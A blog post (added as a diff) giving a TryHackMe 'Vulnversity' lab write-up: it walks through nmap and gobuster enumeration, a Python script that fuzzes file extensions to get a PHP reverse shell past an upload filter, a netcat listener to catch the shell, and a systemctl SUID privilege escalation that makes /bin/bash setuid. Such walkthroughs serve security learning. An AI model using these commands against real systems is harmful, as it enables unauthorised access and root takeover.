@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">TryHackMe - Vulnversity Writeup | SH∆FIQ ∆IM∆N</title>
+<meta property="og:title" content="TryHackMe - Vulnversity Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="twitter:title" content="TryHackMe - Vulnversity Writeup | SH∆FIQ ∆IM∆N" />
+<meta itemprop="name" content="TryHackMe - Vulnversity Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="application-name" content="TryHackMe - Vulnversity Writeup | SH∆FIQ ∆IM∆N" />
+<meta property="og:site_name" content="SH∆FIQ ∆IM∆N" />
+
+<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
+<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+
+
+  <meta itemprop="image" content="http://example.com" />
+  <meta property="og:image" content="http://example.com" />
+  <meta name="twitter:image" content="http://example.com" />
+  <meta name="twitter:image:src" content="http://example.com" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2021-07-10T00:00:00Z />
+    <meta property="article:published_time" content=2021-07-10T00:00:00Z />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "TryHackMe - Vulnversity Writeup",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2021-07-10",
+        "description": "",
+        "wordCount":  1068 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2021-07-10",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "SH∆FIQ ∆IM∆N"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.119.0">
+
+    
+
+    <link rel="canonical" href="http://example.com/posts/thm/vulnversity/">
+    <link href="/style.min.b7e4bda148ee8a6b6e7d052cb6d77374a2dca955a40352c3ccf576dc5f33af2c.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://example.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://example.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/tags/">
+                        Tags
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/search/">
+                        Search
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">TryHackMe - Vulnversity Writeup</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2021-07-10T00:00:00&#43;00:00" itemprop="datePublished"> 10 Jul 2021 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#explaining-the-nmap-scan">Explaining the nmap scan:</a></li>
+        <li><a href="#explaining-gobuster-flag">Explaining gobuster flag:</a></li>
+      </ul>
+    </li>
+    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <p><a href="https://tryhackme.com/room/vulnversity">Link : https://tryhackme.com/room/vulnversity</a></p>
+<h2 id="enumeration">Enumeration</h2>
+<p>First we need to do reconnaissance by using nmap (Network Mapper) to find open ports and to understand the machine. I&rsquo;m gonna run this command:</p>
+<pre tabindex="0"><code>nmap -sC -sV -O -oN nmap/initial &lt;machine ip&gt;
+</code></pre><h3 id="explaining-the-nmap-scan">Explaining the nmap scan:</h3>
+<ul>
+<li>-sC	:= scan using nmap default script</li>
+<li>-sV	:= scan for version</li>
+<li>-O 	:= scan for OS (operating system)</li>
+<li>-oN := output in normal format</li>
+</ul>
+<p>Now our nmap scan is done. So, let&rsquo;s do bad thing <em>evil grin</em> lol. Just joking okayy.</p>
+<p><img src="2.png" alt="2"></p>
+<p>We can see this machine have 6 ports open. The result always screaming that lot of services running on ubuntu. We can see that this machine also have squid proxy and the version too. So, first maybe we can try ftp login as anonymous but unfortunately we cannot login ftp as anonymous.</p>
+<p>This machine have http on port 3333 and running on apache web server. Let&rsquo;s take a look!</p>
+<p><img src="3.png" alt="3"></p>
+<p>OH! what a lovely website. We know that they have a website and we can enumerate futher by using gobuster tool. Gobuster is a tool for searching hidden directory in the web. If you doesn&rsquo;t have gobuster. You&hellip;. yeah&hellip;youuu can visit this <a href="https://github.com/OJ/gobuster">github repos</a>.</p>
+<p>Let&rsquo;s run gobuster using this command</p>
+<pre tabindex="0"><code>gobuster dir -u http://10.10.111.81:3333/ -w /opt/directory-medium.txt --no-error
+</code></pre><h3 id="explaining-gobuster-flag">Explaining gobuster flag:</h3>
+<ul>
+<li>dir	  := using directory mode</li>
+<li>-u		:= specify url</li>
+<li>-w		:= specify wordlist</li>
+<li>&ndash;no-error := no error</li>
+</ul>
+<p><img src="4.png" alt="4"></p>
+<p>So, here&rsquo;s the result. If you look super close but not at the monitor though jk. Gobuster found a hidden directory called /internal. Let&rsquo;s go to that hidden directory.</p>
+<p><img src="5.png" alt="5"></p>
+<p>Apparently, that&rsquo;s directory leads us to this page a.k.a upload page. We can upload php reverse shell on that.</p>
+<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
+<p>But how to get php reverse shell and how to setup, even how to use it. (it&rsquo;s okay I got you ladies &amp; gentlemen)</p>
+<ol>
+<li>Go to this <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">site here</a></li>
+<li>Download it or you can copy it. If you copy it, make sure to save it in the file with php extensions. example := revshell.php</li>
+<li>Open the file and change the ip address to yours tryhackme ip address, If you want to change the port. Just change it. The port in this case is going to be a listing port.</li>
+</ol>
+<p><img src="6.png" alt="6"><br>
+<em>original</em></p>
+<p><img src="7.png" alt="7"><br>
+<em>alter with ip and port</em></p>
+<p>However, when we upload a php file to the page it&rsquo;s gonna response ‘extension not allowed’. Looking back at the questions ‘TASK 4’. Now we know that we can fuzz this upload page with different file extensions.</p>
+<p>So, I gonna make python script for that. You can use burpsuite if you want to. Why I&rsquo;m using python script??? because I want to learn duhhh and I&rsquo;m not saying that I really good in python NO. TBH I wacthed a lot of tutorial for just simple task and I keep adding time in this box. man oh man. It&rsquo;s worth it tho. So here is my script</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.111.81:3333/internal/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">action</span> <span class="o">=</span> <span class="s2">&#34;/index.php&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;file&#39;</span><span class="p">:</span><span class="s1">&#39;/index.php&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;submit&#39;</span><span class="p">:</span><span class="s1">&#39;Submit&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">oldfile</span> <span class="o">=</span> <span class="s2">&#34;revshell.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">file</span> <span class="o">=</span> <span class="s2">&#34;revshell&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">extensions</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;.php&#39;</span><span class="p">,</span><span class="s1">&#39;.php3&#39;</span><span class="p">,</span><span class="s1">&#39;.php4&#39;</span><span class="p">,</span><span class="s1">&#39;.php5&#39;</span><span class="p">,</span><span class="s1">&#39;.phtml&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">ext</span> <span class="ow">in</span> <span class="n">extensions</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">newfile</span> <span class="o">=</span> <span class="n">file</span> <span class="o">+</span> <span class="n">ext</span>
+</span></span><span class="line"><span class="cl">	<span class="n">rename</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">rename</span><span class="p">(</span><span class="n">oldfile</span><span class="p">,</span> <span class="n">newfile</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="n">file_to_upload</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="nb">open</span><span class="p">(</span><span class="n">newfile</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">action</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">file_to_upload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="s2">&#34;Extension not allowed&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;This file not allowed : </span><span class="si">{</span><span class="n">newfile</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;This file is allowed : </span><span class="si">{</span><span class="n">newfile</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">oldfile</span> <span class="o">=</span> <span class="n">newfile</span>
+</span></span></code></pre></div><p>Let&rsquo;s run the script and finally yes. We got a hit boys. This page only accept .phtml extensions. COOL</p>
+<p><img src="8.png" alt="8"></p>
+<p>Now we need to setup netcat listener to the port that we change in the our reverse shell. If you can see I&rsquo;m listen to the port 6969, because I&rsquo;m using this port in my reverse shell</p>
+<pre tabindex="0"><code>nc -lnvp 6969
+</code></pre><p>To activated our reverse shell go to this url http://10.10.111.81:3333/internal/uploads/ . But how you found the <code>/uploads</code> directory. Good questions. Just run gobuster against /internal directory. We found this.</p>
+<p><img src="9.png" alt="9"></p>
+<p>To activated our shell just double click at our reverse shell file. Mine here name revshell.phtml but yours maybe different. I don&rsquo;t know because this is mine not yourssss!!!! joking of course. Please don&rsquo;t be offended. HAHAHAHAH jk.</p>
+<p>Now we&rsquo;re in!!!!Now let&rsquo;s hunt the user flag. So, let&rsquo;s navigate ourselves to the home directory to list a user directory. WOW!!! now we know that bill the one who manage this webserver.</p>
+<p><img src="10.png" alt="10"></p>
+<p>Let&rsquo;s go into bill&rsquo;s home directory to find user flag. Yes we got a user flag. To read this flag you need to use the <code>cat command</code></p>
+<p><img src="11.png" alt="11"></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>How to be root. Now we can do a basic enumeration if you want. Anyways, the questions ask what the most stand out file in SUID file. To find this file called SUID we need run this command</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">find / -user root -perm -4000 -exec ls -ldb <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/
+</span></span></code></pre></div><p>So, this command means find all SUID file that owns by root user. After find it, make it the file in the list using ls. If we got an errors please don&rsquo;t display the errors to us.</p>
+<p><img src="12.png" alt="12"></p>
+<p>We got all of this but how to find the one that most stand out. You can make your linux machine as the base line. Try run the same command in your box and try compare it.</p>
+<p>In this case the file called <code>/bin/systemctl</code> the most stands out. So, we&rsquo;re gonna use systemctl to be root but how. Easy, just go to this site called <a href="https://gtfobins.github.io/#">GTFObins</a> . Try search systemctl suid in it.</p>
+<p>So, I don&rsquo;t know where is the flag are. What I&rsquo;m gonna do, is to make file <code>/bin/bash</code> as <code>SUID</code>. Hmm, sound fun! With it we can be root or to be specific euid root</p>
+<p>To use this command just take all and copy it in the box</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>.service
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;[Service]
+</span></span></span><span class="line"><span class="cl"><span class="s1">Type=oneshot
+</span></span></span><span class="line"><span class="cl"><span class="s1">ExecStart=/bin/sh -c &#34;chmod +s /bin/bash&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">[Install]
+</span></span></span><span class="line"><span class="cl"><span class="s1">WantedBy=multi-user.target&#39;</span> &gt; <span class="nv">$TF</span>
+</span></span><span class="line"><span class="cl">/bin/systemctl link <span class="nv">$TF</span>
+</span></span><span class="line"><span class="cl">/bin/systemctl <span class="nb">enable</span> --now <span class="nv">$TF</span>
+</span></span></code></pre></div><p>After you&rsquo;ve done copy and paste that command.
+Run <code>/bin/bash -p</code> and now become root.</p>
+<p>Just navigate through root directory and you found the flag</p>
+<p><img src="13.png" alt="13"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I’ve learned a lot today. If you have an upload page on your website make sure you use the filter options. Filter out the bad file to make your site a bit safer. Also, you must configure your file permission very-very-very-very-very good. If you see, I become root with simple misconfigure file permission and that&rsquo;s it.</p>
+<p>This room so much fun and I hope you guys have fun and learn something new today.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/hugo-sid" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 shafiqaiman.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="http://example.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
